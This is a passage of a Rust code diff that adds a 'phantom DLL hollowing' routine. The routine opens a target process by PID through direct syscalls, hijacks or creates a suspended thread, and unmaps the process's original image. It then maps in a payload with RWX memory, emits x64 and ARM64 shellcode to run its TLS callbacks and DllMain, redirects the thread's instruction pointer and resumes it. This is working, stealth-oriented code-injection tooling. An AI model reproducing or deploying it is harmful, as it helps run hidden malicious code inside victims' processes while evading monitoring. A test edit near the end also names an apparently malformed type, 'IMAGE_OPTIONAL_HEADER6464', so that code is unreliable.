+        unique_process: *mut c_void,
+        unique_thread: *mut c_void,
+    }
+
+    let pid_ptr = pid as usize as *mut c_void;
+    let mut cid = ClientId {
+        unique_process: pid_ptr,
+        unique_thread: std::ptr::null_mut(),
+    };
+    let mut oa = NtObjectAttributes {
+        length: std::mem::size_of::<NtObjectAttributes>() as u32,
+        root_directory: std::ptr::null_mut(),
+        object_name: std::ptr::null_mut(),
+        attributes: 0,
+        security_descriptor: std::ptr::null_mut(),
+        security_quality_of_service: std::ptr::null_mut(),
+    };
+
+    let mut h_process: *mut c_void = std::ptr::null_mut();
+    let s = crate::syscall!(
+        "NtOpenProcess",
+        &mut h_process as *mut _ as u64,
+        NT_PROCESS_ALL_ACCESS as u64,
+        &mut oa as *mut _ as u64,
+        &mut cid as *mut _ as u64,
+    )
+    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtOpenProcess SSN: {e}"))?;
+    if s < 0 || h_process.is_null() {
+        close_handle!(h_section);
+        let _ = crate::syscall!(
+            "NtUnmapViewOfSection",
+            NT_CURRENT_PROCESS as u64,
+            local_base as u64,
+        );
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: NtOpenProcess({pid}) NTSTATUS {:#010x}",
+            s as u32
+        ));
+    }
+
+    // Try to obtain an existing thread via NtGetNextThread (Windows 10+).
+    // If that fails, create a new suspended thread via NtCreateThreadEx.
+    let h_thread: *mut c_void = {
+        let mut found_thread: usize = 0;
+
+        // NtGetNextThread(ProcessHandle, PreviousThreadHandle, DesiredAccess,
+        //                 HandleAttributes, Flags, NewThreadHandle OUT)
+        // Pass NULL as PreviousThreadHandle to start enumeration.
+        let nt_get_next = crate::syscall!(
+            "NtGetNextThread",
+            h_process as u64,
+            0u64, // previous thread handle (NULL = start)
+            (windows_sys::Win32::System::Threading::THREAD_SET_CONTEXT
+                | windows_sys::Win32::System::Threading::THREAD_GET_CONTEXT
+                | windows_sys::Win32::System::Threading::THREAD_SUSPEND_RESUME) as u64,
+            0u64, // handle attributes
+            0u64, // flags
+            &mut found_thread as *mut _ as u64, // OUT: receives thread handle
+        );
+
+        match nt_get_next {
+            Ok(st) if st >= 0 && found_thread != 0 => {
+                // Successfully obtained a handle to an existing thread.
+            }
+            _ => {
+                // NtGetNextThread not available or failed; fall through to
+                // NtCreateThreadEx.
+                found_thread = 0;
+            }
+        }
+
+        if found_thread != 0 {
+            // Use the existing thread handle from NtGetNextThread.
+            found_thread as *mut c_void
+        } else {
+            // Create a new suspended thread in the target process as a last
+            // resort.  This gives us a thread handle for context manipulation.
+            let start_addr = resolve_nt(b"RtlUserThreadStart\0")
+                .or_else(|| resolve_nt(b"LdrInitializeThunk\0"))
+                .ok_or_else(|| {
+                    anyhow!("phantom_dll_hollow_into_process: RtlUserThreadStart not found")
+                })?;
+
+            let mut new_thread: *mut c_void = std::ptr::null_mut();
+            let s = crate::syscall!(
+                "NtCreateThreadEx",
+                &mut new_thread as *mut _ as u64,
+                NT_THREAD_INJECT_ACCESS as u64,
+                0u64,
+                h_process as u64,
+                start_addr as u64,
+                0u64,
+                NT_THREAD_SUSPENDED as u64,
+                0u64,
+                0u64,
+                0u64,
+                0u64,
+            )
+            .map_err(|e| {
+                anyhow!("phantom_dll_hollow_into_process: NtCreateThreadEx SSN: {e}")
+            })?;
+            if s < 0 || new_thread.is_null() {
+                close_handle!(h_process);
+                close_handle!(h_section);
+                let _ = crate::syscall!(
+                    "NtUnmapViewOfSection",
+                    NT_CURRENT_PROCESS as u64,
+                    local_base as u64,
+                );
+                return Err(anyhow!(
+                    "phantom_dll_hollow_into_process: NtCreateThreadEx NTSTATUS {:#010x}",
+                    s as u32
+                ));
+            }
+            new_thread
+        }
+    };
+
+    // ── Phase 3: Replace target image with phantom section ──────────────
+    //
+    // Read PEB, unmap original image, map phantom section, fix up.
+
+    // Get PEB address via NtQueryInformationProcess.
+    let mut pbi = [0u8; 48];
+    let mut ret_len: u32 = 0;
+    let s = crate::syscall!(
+        "NtQueryInformationProcess",
+        h_process as u64,
+        0u64, // ProcessBasicInformation
+        pbi.as_mut_ptr() as u64,
+        48u64,
+        &mut ret_len as *mut _ as u64,
+    )
+    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtQueryInformationProcess SSN: {e}"))?;
+    if s < 0 || ret_len < 16 {
+        close_handle!(h_thread);
+        close_handle!(h_process);
+        close_handle!(h_section);
+        let _ = crate::syscall!(
+            "NtUnmapViewOfSection",
+            NT_CURRENT_PROCESS as u64,
+            local_base as u64,
+        );
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: NtQueryInformationProcess NTSTATUS {:#010x}",
+            s as u32
+        ));
+    }
+    let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap());
+    if peb_addr == 0 {
+        close_handle!(h_thread);
+        close_handle!(h_process);
+        close_handle!(h_section);
+        let _ = crate::syscall!(
+            "NtUnmapViewOfSection",
+            NT_CURRENT_PROCESS as u64,
+            local_base as u64,
+        );
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: PEB address is NULL"
+        ));
+    }
+    let peb_ptr = peb_addr as *const u8;
+
+    // Read PEB.ImageBaseAddress (offset 0x10).
+    let mut remote_image_base: usize = 0;
+    if !nt_read_exact(
+        h_process,
+        peb_ptr.add(0x10) as usize,
+        &mut remote_image_base as *mut _ as *mut c_void,
+        std::mem::size_of::<usize>(),
+    ) {
+        close_handle!(h_thread);
+        close_handle!(h_process);
+        close_handle!(h_section);
+        let _ = crate::syscall!(
+            "NtUnmapViewOfSection",
+            NT_CURRENT_PROCESS as u64,
+            local_base as u64,
+        );
+        return Err(anyhow!(
+            "phantom_dll_hollow_into_process: failed to read PEB.ImageBaseAddress"
+        ));
+    }
+
+    // Unmap the target's original image.
+    if remote_image_base != 0 {
+        let us = crate::syscall!(
+            "NtUnmapViewOfSection",
+            h_process as u64,
+            remote_image_base as u64,
+        )
+        .unwrap_or(-1);
+        if us < 0 {
+            tracing::warn!(
+                "phantom_dll_hollow_into_process: NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
+                us as u32
+            );
+        }
+    } else {
+        tracing::warn!(
+            "phantom_dll_hollow_into_process: remote_image_base is NULL; skipping unmap"
+        );
+    }
+
+    // Map the phantom section into the target process.
+    let mut remote_base: *mut c_void = remote_image_base as *mut c_void;
+    let mut remote_view_size: usize = 0;
+    let map_result = crate::syscall!(
+        "NtMapViewOfSection",
+        h_section as u64,
+        h_process as u64,
+        &mut remote_base as *mut _ as u64,
+        0u64,
+        0u64,
+        std::ptr::null_mut::<u64>() as u64,
+        &mut remote_view_size as *mut _ as u64,
+        1u64,
+        0u64,
+        PAGE_EXECUTE_READWRITE as u64,
+    );
+    let mapped_ok = match map_result {
+        Ok(st) if st >= 0 && !remote_base.is_null() => true,
+        _ => false,
+    };
+
+    if !mapped_ok {
+        // Retry without specifying a base address.
+        remote_base = std::ptr::null_mut();
+        remote_view_size = 0;
+        let retry_result = crate::syscall!(
+            "NtMapViewOfSection",
+            h_section as u64,
+            h_process as u64,
+            &mut remote_base as *mut _ as u64,
+            0u64,
+            0u64,
+            std::ptr::null_mut::<u64>() as u64,
+            &mut remote_view_size as *mut _ as u64,
+            1u64,
+            0u64,
+            PAGE_EXECUTE_READWRITE as u64,
+        );
+        match retry_result {
+            Ok(st) if st >= 0 && !remote_base.is_null() => {}
+            Ok(st) => {
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                close_handle!(h_section);
+                let _ = crate::syscall!(
+                    "NtUnmapViewOfSection",
+                    NT_CURRENT_PROCESS as u64,
+                    local_base as u64,
+                );
+                return Err(anyhow!(
+                    "phantom_dll_hollow_into_process: NtMapViewOfSection(remote) NTSTATUS {:#010x}",
+                    st as u32
+                ));
+            }
+            Err(e) => {
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                close_handle!(h_section);
+                let _ = crate::syscall!(
+                    "NtUnmapViewOfSection",
+                    NT_CURRENT_PROCESS as u64,
+                    local_base as u64,
+                );
+                return Err(anyhow!(
+                    "phantom_dll_hollow_into_process: NtMapViewOfSection(remote) failed: {e}"
+                ));
+            }
+        }
+    }
+    let remote_base_usize = remote_base as usize;
+
+    // Unmap local view.
+    let _ = crate::syscall!(
+        "NtUnmapViewOfSection",
+        NT_CURRENT_PROCESS as u64,
+        local_base as u64,
+    );
+
+    // Close section handle.
+    close_handle!(h_section);
+
+    // Apply relocations.
+    let delta = remote_base_usize as isize - preferred_base as isize;
+    if delta != 0 {
+        apply_relocations_remote(h_process, remote_base_usize, nt, payload, delta)?;
+    }
+
+    // Rebuild IAT.
+    fix_iat_remote(h_process, remote_base_usize, nt, payload)?;
+
+    // Apply per-section protections.
+    apply_section_protections(h_process, remote_base_usize, nt);
+
+    // Flush instruction cache.
+    let _ = crate::syscall!(
+        "NtFlushInstructionCache",
+        h_process as u64,
+        remote_base as u64,
+        (*nt).OptionalHeader.SizeOfImage as u64,
+    );
+
+    // Update PEB.ImageBaseAddress.
+    if !nt_write_exact(
+        h_process,
+        peb_ptr.add(0x10) as usize,
+        &remote_base_usize as *const _ as *const c_void,
+        std::mem::size_of::<usize>(),
+    ) {
+        tracing::warn!(
+            "phantom_dll_hollow_into_process: failed to update PEB.ImageBaseAddress"
+        );
+    }
+
+    // ── Phase 4: Build loader stub (TLS callbacks, .pdata, DllMain) and resume ─
+    //
+    // The Windows loader normally:
+    //   1. Calls RtlAddFunctionTable to register .pdata for SEH unwinding.
+    //   2. Invokes TLS callbacks with (hinstDLL, DLL_PROCESS_ATTACH, NULL).
+    //   3. Calls the entry point as DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL).
+    //
+    // Since we bypass the loader entirely, we build a position-independent
+    // shellcode stub that performs this missing work before jumping to the
+    // payload entry point with the correct DllMain calling convention.
+
+    // Collect TLS callbacks from the PE's TLS directory.
+    let mut tls_callback_vas: Vec<usize> = Vec::new();
+    {
+        const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
+        let tls_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+        if tls_dir.VirtualAddress != 0 && tls_dir.Size != 0 {
+            let tls_rva = tls_dir.VirtualAddress as usize;
+            if tls_rva + 40 <= image_size {
+                let tls_offset = rva_to_file_offset(payload, tls_rva);
+                if tls_offset + 32 <= payload.len() {
+                    let callbacks_va_raw = u64::from_le_bytes(
+                        payload[tls_offset + 24..tls_offset + 32]
+                            .try_into()
+                            .unwrap_or([0u8; 8]),
+                    ) as usize;
+                    if callbacks_va_raw != 0 {
+                        let callbacks_rva = callbacks_va_raw.wrapping_sub(preferred_base);
+                        let callbacks_file_offset = rva_to_file_offset(payload, callbacks_rva);
+                        let mut remaining = 32u32;
+                        let mut slot_idx = 0usize;
+                        loop {
+                            if remaining == 0 {
+                                break;
+                            }
+                            remaining -= 1;
+                            let slot_offset = callbacks_file_offset + slot_idx * 8;
+                            if slot_offset + 8 > payload.len() {
+                                break;
+                            }
+                            let cb_va_raw = u64::from_le_bytes(
+                                payload[slot_offset..slot_offset + 8]
+                                    .try_into()
+                                    .unwrap_or([0u8; 8]),
+                            ) as usize;
+                            if cb_va_raw == 0 {
+                                break;
+                            }
+                            let cb_va = (cb_va_raw as isize + delta) as usize;
+                            if cb_va >= remote_base_usize
+                                && cb_va < remote_base_usize + image_size
+                            {
+                                tls_callback_vas.push(cb_va);
+                            }
+                            slot_idx += 1;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Find .pdata section for exception unwinding registration.
+    let (pdata_va, pdata_count) = {
+        let mut result = (0usize, 0u32);
+        const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
+        let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+        if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
+            let va = remote_base_usize + exc_dir.VirtualAddress as usize;
+            let count = (exc_dir.Size as usize / 12) as u32;
+            if count > 0 {
+                result = (va, count);
+            }
+        }
+        result
+    };
+
+    // Resolve RtlAddFunctionTable from ntdll via PEB-walk.
+    let rtl_add_fn_addr = if pdata_va != 0 && pdata_count != 0 {
+        resolve_nt(b"RtlAddFunctionTable\0").unwrap_or(0)
+    } else {
+        0
+    };
+
+    let needs_stub = !tls_callback_vas.is_empty()
+        || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
+
+    // Build the loader stub if needed, otherwise jump directly to entry point.
+    let thread_start_va = if needs_stub {
+        let mut stub: Vec<u8> = Vec::with_capacity(256);
+
+        #[cfg(target_arch = "x86_64")]
+        {
+            // ABI prologue: reserve 32 bytes of shadow space.
+            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20
+
+            // .pdata registration.
+            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
+                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, pdata_va
+                stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xBA]); // mov edx, entry_count
+                stub.extend_from_slice(&pdata_count.to_le_bytes());
+                stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, remote_base
+                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
+                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, RtlAddFunctionTable
+                stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+            }
+
+            // TLS callback invocations: DllMain convention (hinstDLL, DLL_PROCESS_ATTACH, NULL).
+            for &cb_va in &tls_callback_vas {
+                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
+                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
+                stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
+                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, cb_va
+                stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
+                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+            }
+
+            // DllMain entry point call: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+            let entry_va = (remote_base_usize + entry_point_rva) as u64;
+            stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
+            stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
+            stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
+            stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
+            stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, entry_va
+            stub.extend_from_slice(&entry_va.to_le_bytes());
+            stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+
+            // ABI epilogue.
+            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20
+
+            // Infinite halt after DllMain returns.
+            stub.extend_from_slice(&[0xEB, 0xFE]); // jmp $-2
+        }
+
+        #[cfg(target_arch = "aarch64")]
+        {
+            // .pdata registration: RtlAddFunctionTable(x0=funcTable, x1=count, x2=base)
+            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
+                push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
+                push_arm64_mov_imm64(&mut stub, 1, pdata_count as u64);
+                push_arm64_mov_imm64(&mut stub, 2, remote_base_usize as u64);
+                push_arm64_mov_imm64(&mut stub, 16, rtl_add_fn_addr as u64);
+                push_arm64_blr(&mut stub, 16);
+            }
+
+            // TLS callbacks with DllMain convention.
+            for &cb_va in &tls_callback_vas {
+                push_arm64_dll_entry_call(&mut stub, cb_va as u64, remote_base_usize as u64);
+            }
+
+            // DllMain entry: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+            let entry_va = (remote_base_usize + entry_point_rva) as u64;
+            push_arm64_dll_entry_call(&mut stub, entry_va, remote_base_usize as u64);
+
+            // Infinite halt after DllMain returns.
+            push_arm64_brk(&mut stub, 0xF000); // BRK #0xF000
+        }
+
+        // Allocate RW memory for the stub in the target process.
+        let mut stub_mem: *mut c_void = std::ptr::null_mut();
+        let mut stub_alloc_size = stub.len();
+        let alloc_s = crate::syscall!(
+            "NtAllocateVirtualMemory",
+            h_process as u64,
+            &mut stub_mem as *mut _ as u64,
+            0u64,
+            &mut stub_alloc_size as *mut _ as u64,
+            (windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
+            crate::win_types::PAGE_READWRITE as u64,
+        );
+        let alloc_ok = match alloc_s {
+            Ok(st) if st >= 0 && !stub_mem.is_null() => true,
+            _ => false,
+        };
+        if !alloc_ok {
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "phantom_dll_hollow_into_process: NtAllocateVirtualMemory for loader stub failed"
+            ));
+        }
+
+        // Write stub bytes.
+        let mut stub_written = 0usize;
+        let write_s = crate::syscall!(
+            "NtWriteVirtualMemory",
+            h_process as u64,
+            stub_mem as u64,
+            stub.as_ptr() as u64,
+            stub.len() as u64,
+            &mut stub_written as *mut _ as u64,
+        );
+        let write_ok = match write_s {
+            Ok(st) if st >= 0 => stub_written == stub.len(),
+            _ => false,
+        };
+        if !write_ok {
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "phantom_dll_hollow_into_process: NtWriteVirtualMemory for loader stub failed"
+            ));
+        }
+
+        // Make the stub executable (RX).
+        let mut prot_base = stub_mem;
+        let mut prot_size = stub.len();
+        let mut old_prot = 0u32;
+        let prot_s = crate::syscall!(
+            "NtProtectVirtualMemory",
+            h_process as u64,
+            &mut prot_base as *mut _ as u64,
+            &mut prot_size as *mut _ as u64,
+            PAGE_EXECUTE_READ as u64,
+            &mut old_prot as *mut _ as u64,
+        );
+        let prot_ok = match prot_s {
+            Ok(st) if st >= 0 => true,
+            _ => false,
+        };
+        if !prot_ok {
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "phantom_dll_hollow_into_process: NtProtectVirtualMemory(RX) for loader stub failed"
+            ));
+        }
+
+        // Flush instruction cache for the stub.
+        let _ = crate::syscall!(
+            "NtFlushInstructionCache",
+            h_process as u64,
+            stub_mem as u64,
+            stub.len() as u64,
+        );
+
+        tracing::debug!(
+            "phantom_dll_hollow_into_process: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries)",
+            stub_mem,
+            tls_callback_vas.len(),
+            pdata_count,
+        );
+
+        stub_mem as u64
+    } else {
+        // No TLS callbacks and no .pdata — set entry point directly.
+        (remote_base_usize + entry_point_rva) as u64
+    };
+
+    // Set the thread context and resume.
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_FULL;
+
+    let get_ctx = crate::syscall!(
+        "NtGetContextThread",
+        h_thread as u64,
+        &mut ctx as *mut _ as u64,
+    );
+    match get_ctx {
+        Ok(st) if st >= 0 => {
+            set_context_instruction_pointer(&mut ctx, thread_start_va);
+            tracing::debug!(
+                "phantom_dll_hollow_into_process: setting thread {} to {:#x}",
+                CONTEXT_IP_NAME,
+                thread_start_va,
+            );
+
+            let set_ctx = crate::syscall!(
+                "NtSetContextThread",
+                h_thread as u64,
+                &ctx as *const _ as u64,
+            );
+            match set_ctx {
+                Ok(st2) if st2 >= 0 => {}
+                Ok(st2) => {
+                    close_handle!(h_thread);
+                    close_handle!(h_process);
+                    return Err(anyhow!(
+                        "phantom_dll_hollow_into_process: NtSetContextThread NTSTATUS {:#010x}",
+                        st2 as u32
+                    ));
+                }
+                Err(e) => {
+                    close_handle!(h_thread);
+                    close_handle!(h_process);
+                    return Err(anyhow!(
+                        "phantom_dll_hollow_into_process: NtSetContextThread failed: {}",
+                        e
+                    ));
+                }
+            }
+        }
+        Ok(st) => {
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "phantom_dll_hollow_into_process: NtGetContextThread NTSTATUS {:#010x}",
+                st as u32
+            ));
+        }
+        Err(e) => {
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "phantom_dll_hollow_into_process: NtGetContextThread failed: {}",
+                e
+            ));
+        }
+    }
+
+    // Resume the host thread — execution begins at the loader stub or entry point.
+    let resume = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
+    match resume {
+        Ok(st) if st >= 0 => {}
+        Ok(st) => {
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "phantom_dll_hollow_into_process: NtResumeThread NTSTATUS {:#010x}",
+                st as u32
+            ));
+        }
+        Err(e) => {
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "phantom_dll_hollow_into_process: NtResumeThread failed: {}",
+                e
+            ));
+        }
+    }
+
+    tracing::info!(
+        "phantom_dll_hollow_into_process: phantom DLL ({} bytes) mapped at {:#x} in PID {}",
+        payload.len(),
+        remote_base_usize,
+        pid,
+    );
+
+    Ok(PhantomHollowResult {
+        process_handle: h_process,
+        thread_handle: h_thread,
+        phantom_base: remote_base_usize,
+    })
+}
+
+// ── ARM64 shellcode helpers ──────────────────────────────────────────────────
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn push_arm64_instruction(stub: &mut Vec<u8>, instruction: u32) {
+    stub.extend_from_slice(&instruction.to_le_bytes());
+}
+
+/// Emit a `MOVZ`/`MOVK` sequence to load a 64-bit immediate into `reg`.
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn push_arm64_mov_imm64(stub: &mut Vec<u8>, reg: u8, value: u64) {
+    debug_assert!(reg < 32);
+    let rd = (reg as u32) & 0x1f;
+    for halfword in 0..4u32 {
+        let imm16 = ((value >> (halfword * 16)) & 0xffff) as u32;
+        let opcode = if halfword == 0 {
+            0xD280_0000 // MOVZXd
+        } else {
+            0xF280_0000 // MOVKXd
+        };
+        push_arm64_instruction(stub, opcode | (halfword << 21) | (imm16 << 5) | rd);
+    }
+}
+
+/// Emit `BLR xN` (branch with link register to address in register N).
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn push_arm64_blr(stub: &mut Vec<u8>, reg: u8) {
+    push_arm64_instruction(stub, 0xD63F_0000 | (((reg as u32) & 0x1f) << 5));
+}
+
+/// Emit `BR xN` (branch to address in register N, no return).
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn push_arm64_br(stub: &mut Vec<u8>, reg: u8) {
+    push_arm64_instruction(stub, 0xD61F_0000 | (((reg as u32) & 0x1f) << 5));
+}
+
+/// Emit a Windows ARM64 DllMain-style call sequence:
+///   x0 = image_base, x1 = DLL_PROCESS_ATTACH (1), x2 = 0 (NULL),
+///   x16 = target, BLR x16.
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn push_arm64_dll_entry_call(stub: &mut Vec<u8>, target: u64, image_base: u64) {
+    push_arm64_mov_imm64(stub, 0, image_base); // x0 = hinstDLL
+    push_arm64_mov_imm64(stub, 1, 1);          // x1 = DLL_PROCESS_ATTACH
+    push_arm64_mov_imm64(stub, 2, 0);          // x2 = lpvReserved = NULL
+    push_arm64_mov_imm64(stub, 16, target);    // x16 = target address
+    push_arm64_blr(stub, 16);                   // blr x16
+}
+
+/// Emit `BRK #imm16` — ARM64 breakpoint (used as infinite halt).
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn push_arm64_brk(stub: &mut Vec<u8>, imm: u32) {
+    // BRK encoding: 0xD4200000 | (imm16 << 5)
+    push_arm64_instruction(stub, 0xD420_0000 | ((imm & 0xffff) << 5));
+}
+
 // ── Unit tests ───────────────────────────────────────────────────────────────
 
 #[cfg(test)]
@@ -1247,7 +2572,7 @@ mod tests {
                                                                      // NumberOfSections at 0x86
         buf[0x86..0x88].copy_from_slice(&(1u16).to_le_bytes());
         // SizeOfOptionalHeader at 0x94
-        let opt_header_size = std::mem::size_of::<winapi::um::winnt::IMAGE_OPTIONAL_HEADER64>();
+        let opt_header_size = std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_OPTIONAL_HEADER6464>();
         buf[0x94..0x96].copy_from_slice(&(opt_header_size as u16).to_le_bytes());
         // Magic at 0x98 (OptionalHeader +0)
         buf[0x98..0x9A].copy_from_slice(&(0x020Bu16).to_le_bytes()); // PE64
